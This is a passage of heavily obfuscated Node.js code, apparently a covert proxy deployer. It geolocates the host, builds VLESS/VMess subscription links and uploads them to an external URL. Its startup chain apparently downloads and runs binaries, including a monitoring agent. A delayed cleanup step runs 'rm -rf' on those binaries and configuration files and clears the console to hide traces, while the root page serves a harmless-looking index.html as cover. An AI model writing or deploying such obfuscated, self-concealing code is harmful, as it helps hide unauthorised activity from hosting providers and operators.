axios['get']('http://ip-api.com/json',{'headers':{'User-Agent':_0x4a5754(0x17a),'timeout':0xbb8}});if(_0x329a18[_0x4a5754(0x1bd)]&&_0x329a18[_0x4a5754(0x1bd)][_0x4a5754(0x197)]===_0x4a5754(0x186)&&_0x329a18[_0x4a5754(0x1bd)][_0x4a5754(_0x50c08d._0x429d51)]&&_0x329a18[_0x4a5754(_0x50c08d._0x25faa5)]['org'])return(_0x329a18[_0x4a5754(0x1bd)][_0x4a5754(0x160)]+'-'+_0x329a18[_0x4a5754(_0x50c08d._0x16b446)]['org'])[_0x4a5754(0x185)](/\s+/g,'_');}catch(_0x2919a3){}}return'Unknown';}async function _0xc075fd(_0x5075c8){const _0x11a0d8={_0x11d693:0x152,_0x4d7d8c:0x1cd,_0xa2d61a:0x1a3,_0x3d1f23:0x1f5,_0x477b1f:0x1b1,_0x3a6632:0x1b5,_0x999732:0x144,_0x50b523:0x192,_0x4406a1:0x1f5},_0x120b19=await _0x32c88a(),_0x49b04a=NAME?NAME+'-'+_0x120b19:_0x120b19;return new Promise(_0x19270a=>{const _0x231c00={_0x19d86f:0x1bb,_0x57cd0c:0x1a0,_0x464099:0x1a1};setTimeout(()=>{const _0x1dc73b=_0x163a,_0x1d4d61={'v':'2','ps':''+_0x49b04a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1dc73b(_0x11a0d8._0x11d693),'net':'ws','type':_0x1dc73b(0x1a7),'host':_0x5075c8,'path':_0x1dc73b(0x157),'tls':_0x1dc73b(0x158),'sni':_0x5075c8,'alpn':'','fp':_0x1dc73b(_0x11a0d8._0x4d7d8c)},_0x3e5cf1='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x5075c8+_0x1dc73b(_0x11a0d8._0xa2d61a)+_0x5075c8+_0x1dc73b(0x175)+_0x49b04a+'\x0a\x0avmess://'+Buffer[_0x1dc73b(_0x11a0d8._0x3d1f23)](JSON[_0x1dc73b(_0x11a0d8._0x477b1f)](_0x1d4d61))['toString']('base64')+_0x1dc73b(0x17e)+UUID+'@'+CFIP+':'+CFPORT+_0x1dc73b(_0x11a0d8._0x3a6632)+_0x5075c8+'&fp=firefox&type=ws&host='+_0x5075c8+_0x1dc73b(_0x11a0d8._0x999732)+_0x49b04a+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x1dc73b(_0x11a0d8._0x3d1f23)](_0x3e5cf1)['toString'](_0x1dc73b(0x16e))),fs[_0x1dc73b(_0x11a0d8._0x50b523)](subPath,Buffer[_0x1dc73b(_0x11a0d8._0x4406a1)](_0x3e5cf1)[_0x1dc73b(0x1bb)]('base64')),console['log'](FILE_PATH+_0x1dc73b(0x1de)),uploadNodes(),app[_0x1dc73b(0x1b7)]('/'+SUB_PATH,(_0x32ed2d,_0x2a6d87)=>{const _0xd78d58=_0x1dc73b,_0x36111b=Buffer[_0xd78d58(0x1f5)](_0x3e5cf1)[_0xd78d58(_0x231c00._0x19d86f)](_0xd78d58(0x16e));_0x2a6d87['set']('Content-Type',_0xd78d58(_0x231c00._0x57cd0c)),_0x2a6d87[_0xd78d58(_0x231c00._0x464099)](_0x36111b);}),_0x19270a(_0x3e5cf1);},0x7d0);});}}async function uploadNodes(){const _0x138c48={_0x1770cc:0x197,_0x404a6a:0x14f,_0x54294a:0x165,_0x4de240:0x1cc,_0x4d17f2:0x1ac},_0x58b60b=_0x351c3c;if(UPLOAD_URL&&PROJECT_URL){const _0x235aeb=PROJECT_URL+'/'+SUB_PATH,_0x3dacd2={'subscription':[_0x235aeb]};try{const _0x2a49f7=await axios[_0x58b60b(0x150)](UPLOAD_URL+'/api/add-subscriptions',_0x3dacd2,{'headers':{'Content-Type':'application/json'}});return _0x2a49f7&&_0x2a49f7[_0x58b60b(_0x138c48._0x1770cc)]===0xc8?(console[_0x58b60b(0x19a)]('Subscription\x20uploaded\x20successfully'),_0x2a49f7):null;}catch(_0x4a9f5c){if(_0x4a9f5c[_0x58b60b(_0x138c48._0x404a6a)]){if(_0x4a9f5c[_0x58b60b(_0x138c48._0x404a6a)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x336786=fs['readFileSync'](listPath,_0x58b60b(_0x138c48._0x54294a)),_0x51d663=_0x336786['split']('\x0a')[_0x58b60b(_0x138c48._0x4de240)](_0x377be4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x58b60b(0x1bc)](_0x377be4));if(_0x51d663[_0x58b60b(0x181)]===0x0)return;const _0x4744b8=JSON['stringify']({'nodes':_0x51d663});try{const _0x6d07b2=await axios['post'](UPLOAD_URL+_0x58b60b(0x1e7),_0x4744b8,{'headers':{'Content-Type':_0x58b60b(_0x138c48._0x4d17f2)}});return _0x6d07b2&&_0x6d07b2[_0x58b60b(0x197)]===0xc8?(console[_0x58b60b(0x19a)](_0x58b60b(0x1df)),_0x6d07b2):null;}catch(_0x72f688){return null;}}else return;}}function cleanFiles(){const _0x3b66d2={_0x436319:0x19e,_0x219df8:0x194};setTimeout(()=>{const _0xd8a71c={_0x399b32:0x19a,_0x8ff86d:0x143,_0x1e2c88:0x159},_0x44bcdd={_0x4843ff:0x1ef,_0x4e19c8:0x143,_0x52af73:0x159},_0xabf933=_0x163a,_0x2be398=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2be398['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2be398['push'](phpPath);process['platform']==='win32'?exec(_0xabf933(_0x3b66d2._0x436319)+_0x2be398[_0xabf933(_0x3b66d2._0x219df8)]('\x20')+_0xabf933(0x19d),_0x488b22=>{const _0x11b255=_0xabf933;console[_0x11b255(_0x44bcdd._0x4843ff)](),console['log'](_0x11b255(_0x44bcdd._0x4e19c8)),console[_0x11b255(0x19a)](_0x11b255(_0x44bcdd._0x52af73));}):exec('rm\x20-rf\x20'+_0x2be398[_0xabf933(0x194)]('\x20')+'\x20>/dev/null\x202>&1',_0x2fc1f8=>{const _0x5621fe=_0xabf933;console['clear'](),console[_0x5621fe(_0xd8a71c._0x399b32)](_0x5621fe(_0xd8a71c._0x8ff86d)),console[_0x5621fe(0x19a)](_0x5621fe(_0xd8a71c._0x1e2c88));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5d978f={_0x4625c4:0x1f4,_0x13f5c3:0x14d,_0x4a77bb:0x19a,_0x201c68:0x1d5,_0x2269bf:0x162},_0x1e4f7c=_0x351c3c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1e4f7c(0x19a)](_0x1e4f7c(_0x5d978f._0x4625c4));return;}try{const _0x5a0637=await axios[_0x1e4f7c(0x150)](_0x1e4f7c(_0x5d978f._0x13f5c3),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1e4f7c(0x1ac)}});return console[_0x1e4f7c(_0x5d978f._0x4a77bb)](_0x1e4f7c(_0x5d978f._0x201c68)),_0x5a0637;}catch(_0x178b9c){return console[_0x1e4f7c(_0x5d978f._0x2269bf)](_0x1e4f7c(0x1c0)+_0x178b9c[_0x1e4f7c(0x1fe)]),null;}}async function startserver(){const _0x54b93c={_0x3a3a44:0x17f},_0x157ec8=_0x351c3c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x20c0d3){console[_0x157ec8(0x162)](_0x157ec8(_0x54b93c._0x3a3a44),_0x20c0d3);}}startserver()[_0x351c3c(0x204)](_0x3664c2=>{const _0x33d064={_0x2eae17:0x162},_0x37f56f=_0x351c3c;console[_0x37f56f(_0x33d064._0x2eae17)](_0x37f56f(0x1aa),_0x3664c2);}),app['get']('/',async function(_0x5829d2,_0x2a7495){const _0x5b0159={_0x36357a:0x16a,_0x25b8d4:0x1d0},_0x1a0b8c=_0x351c3c;try{const _0x1f19ce=path[_0x1a0b8c(0x194)](__dirname,_0x1a0b8c(0x1d6)),_0x1a1fb4=await fs[_0x1a0b8c(_0x5b0159._0x36357a)][_0x1a0b8c(_0x5b0159._0x25b8d4)](_0x1f19ce,_0x1a0b8c(0x205));_0x2a7495[_0x1a0b8c(0x1a1)](_0x1a1fb4);}catch(_0x20cacd){_0x2a7495['send'](_0x1a0b8c(0x19b));}}),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
